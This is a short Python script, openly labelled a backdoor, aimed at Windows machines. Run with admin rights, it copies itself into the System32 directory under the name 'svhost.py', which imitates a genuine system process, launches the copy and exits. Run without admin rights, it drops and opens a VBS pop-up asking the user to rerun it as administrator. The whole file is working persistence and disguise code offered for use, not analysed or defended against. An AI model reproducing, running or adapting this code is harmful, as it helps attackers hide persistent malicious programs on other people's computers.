# All system imports no pip installs needed
import sys, os, shutil, ctypes


def backdoor():
    system32            = os.getenv('WINDIR') + "\\System32" # Get the system32 directory
    backdoor_path       = system32 + f"\\svhost.py" # Path to the backdoor (make sure to change file extension depending on your file)
    file_path           = sys.argv[0] # Get the path to the current running file

    def isAdmin():
        try: is_admin = os.getuid() == 0
        except AttributeError: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin

    if file_path != backdoor_path:
        if isAdmin():                                       # If the user is running file as admin
            try:
                shutil.copy2(file_path, backdoor_path)      # Copy the file to the backdoor folder
                os.startfile(backdoor_path)                 # Start the file
                os._exit(1)
            except: pass
        else:
            # If the user is not running file as admin, write error message as vbs script
            with open(os.getenv("TEMP") + "\\error.vbs", "w") as f: f.write('x=msgbox("You must run this program as administrator.", 0+16, "Error")')
            os.startfile(os.getenv("TEMP") + "\\error.vbs")
            os._exit(1)
    else: return True


if backdoor():
    print("[+] Backdoor created successfully!")
    input("\n[+] Press enter to exit...")
